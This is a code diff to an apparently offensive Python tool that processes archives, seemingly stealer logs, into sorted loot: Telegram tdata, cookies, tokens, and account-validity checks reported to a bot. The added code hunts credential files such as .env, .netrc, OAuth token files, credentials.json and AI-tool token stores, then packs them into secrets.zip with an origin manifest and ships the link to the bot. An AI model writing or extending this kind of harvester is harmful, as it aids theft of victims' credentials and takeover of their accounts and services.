@@ -1690,6 +1690,92 @@ def pack_json(files):
                    ("=" * 48, "\n".join(manifest)))
     return zp, total
 
+# secret-ish files collected automatically (like tokens.txt)
+SECRET_NAMES = {
+    "credentials.json": "credentials_json",
+    "oauth_creds.json": "oauth_creds_json",
+    "oauth.json": "oauth_json",
+    "token.json": "token_json",
+    "tokens.json": "tokens_json",
+    "secrets.json": "secrets_json",
+    "apps.json": "apps_json",
+    "config.yaml": "config_yaml",
+    "config.yml": "config_yaml",
+    "hosts.yml": "hosts_yml",
+    "antigravity-oauth-token": "antigravity_oauth_token",
+    "opencode.db": "opencode_db",
+    ".secret": "secret",
+    ".env": "env",
+    ".env.local": "env_local",
+    ".env.production": "env_production",
+    ".netrc": "netrc",
+}
+SECRET_FILTERS = ["secrets.json", "credentials.json", "oauth*.json",
+                  "token*.json", "tokens.json", "apps.json", "config.yaml",
+                  "config.yml", "hosts.yml", "antigravity-oauth-token",
+                  "opencode.db", "*.db", ".env*", "*.env", ".netrc",
+                  "*.netrc", ".secret", "*.secret"]
+
+def find_secrets(roots):
+    """Every secret file (by exact name) anywhere in the trees."""
+    out = []
+    for root in roots:
+        try:
+            if not root or not Path(root).exists():
+                continue
+            for p in root.rglob("*"):
+                try:
+                    if p.is_file() and p.name.lower() in SECRET_NAMES:
+                        out.append(p)
+                except OSError:
+                    continue
+        except OSError:
+            continue
+    return out
+
+def pack_secrets(files):
+    """secrets.zip: one folder per file TYPE (env/, credentials_json/…);
+    original names kept, duplicates become name_#1 / name_#2 inside the
+    folder; found_in.txt maps every file to its origin path."""
+    if not files:
+        return None, 0
+    zp = OUT / "secrets.zip"
+    counts = dict.fromkeys(SECRET_NAMES.values(), 0)
+    manifest, total = [], 0
+    base = WORK / "ex"
+    with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
+        files.sort(key=lambda p: (p.name.lower(), str(p)))
+        for p in files:
+            fold = SECRET_NAMES.get(p.name.lower())
+            if not fold:
+                continue
+            counts[fold] += 1
+            n = counts[fold]
+            if n <= 1:
+                inner = p.name
+            elif p.name.startswith("."):
+                inner = "%s_#%d" % (p.name, n)
+            else:
+                stem, ext = os.path.splitext(p.name)
+                inner = "%s_#%d%s" % (stem, n, ext)
+            try:
+                z.write(str(p), "%s/%s" % (fold, inner))
+            except Exception:
+                continue
+            try:
+                rel = str(p.relative_to(base))
+            except Exception:
+                rel = str(p)
+            manifest.append("%s/%s  <-  %s" % (fold, inner, rel))
+            total += 1
+        if not total:
+            zp.unlink(missing_ok=True)
+            return None, 0
+        z.writestr("found_in.txt",
+                   "SECRET FILES FOUND IN THE ARCHIVE\n%s\n%s\n" %
+                   ("=" * 48, "\n".join(manifest)))
+    return zp, total
+
 def finish(task, stage, **extra):
     """Terminal state for a job: paint the card, report to the bot, back to idle."""
     st(stage, 100 if stage == "done" else _state.get("pct", 0),
@@ -1700,7 +1786,8 @@ def finish(task, stage, **extra):
                     if k in ("err", "found", "cookies", "tried", "sent", "failed",
                              "links", "auth", "auth_sent", "auth_fid", "td_total",
                              "td_parts", "td_via", "tok_total", "tok_parts",
-                             "js_total", "js_parts", "tk_total", "tk_valid",
+                             "js_total", "js_parts", "sec_total", "sec_parts",
+                             "tk_total", "tk_valid",
                              "tk_prem", "tk_2fa", "tk_frozen", "tk_dead",
                              "tk_err", "tk_zip", "tk_proxies", "tk_link",
                              "ck_total", "ck_live", "ck_prem", "ck_free",
@@ -1739,8 +1826,8 @@ def process(task):
         else:
             finish(task, "error", err=why)
         return
-    shutil.rmtree(WORK / "dl", ignore_errors=True) \
-        if not (task.get("tdata") or task.get("json")) else None
+    # keep dl/ for the whole run: the json / secrets / tdata passes all need
+    # the archive on disk, WORK is wiped at the end anyway.
     packed, auths = search_pack(WORK / "ex", bool(task.get("auth")))
     if stop():
         shutil.rmtree(WORK, ignore_errors=True)
@@ -1870,6 +1957,40 @@ def process(task):
         js_parts, js_link = ship(js_zip, js_cap)
         if js_link:
             links["json"] = js_link
+    # ── secret files — automatic, like tokens.txt ──
+    secf = find_secrets([WORK / "ex", WORK / "tdex", WORK / "tdfull"])
+    if not secf:
+        st("extract", 45, msg="pulling secret files from the archive")
+        try:
+            _extract(arc, WORK / "sx", task.get("passwords") or [],
+                     SECRET_FILTERS)
+        except Exception as e:
+            sys.stdout.write("sx pass: %s\n" % e)
+        sys.stdout.flush()
+        secf = find_secrets([WORK / "sx"])
+        if not secf:
+            st("extract", 45, msg="full extract to hunt every secret file")
+            try:
+                _extract(arc, WORK / "sx", task.get("passwords") or [], None)
+            except Exception as e:
+                sys.stdout.write("sx full pass: %s\n" % e)
+            sys.stdout.flush()
+            secf = find_secrets([WORK / "sx"])
+    sys.stdout.write("secret hunt: %d files\n" % len(secf)); sys.stdout.flush()
+    sec_zip, sec_total = pack_secrets(secf)
+    sec_parts, sec_link = 0, None
+    if sec_zip:
+        def sec_cap(size, idx, count, tot, split):
+            return (f"{gold_header('SECRET FILES', esc('%d found' % sec_total))}"
+                    f"\n{THIN}\n"
+                    f"🗝 {bold('Files')}    {code(sec_total)} secret files\n"
+                    f"🏷 {bold('Layout')}   one folder per type — {code('env/')}, "
+                    f"{code('credentials_json/')}, {code('secrets_json/')}…\n"
+                    + ship_note(idx, count, size, tot, split, "secrets.zip") +
+                    f"🗝 {bold('Manifest')}  found_in.txt shows each origin path")
+        sec_parts, sec_link = ship(sec_zip, sec_cap)
+        if sec_link:
+            links["secrets"] = sec_link
     ck = check_auths(auths) if (want_auth and task.get("authcheck") and auths) else {}
     shutil.rmtree(WORK, ignore_errors=True)
     st("done", 100, job=task.get("job"), vm=SPECS)
@@ -1878,7 +1999,8 @@ def process(task):
            auth_sent=auth_sent, auth_fid=auth_fid if want_auth else None,
            td_total=td_total, td_parts=td_parts, td_via=td_via,
            tok_total=tok_total, tok_parts=tok_parts,
-           js_total=js_total, js_parts=js_parts, **tk, **ck)
+           js_total=js_total, js_parts=js_parts,
+           sec_total=sec_total, sec_parts=sec_parts, **tk, **ck)
 
 def main():
     OUT.mkdir(parents=True, exist_ok=True)
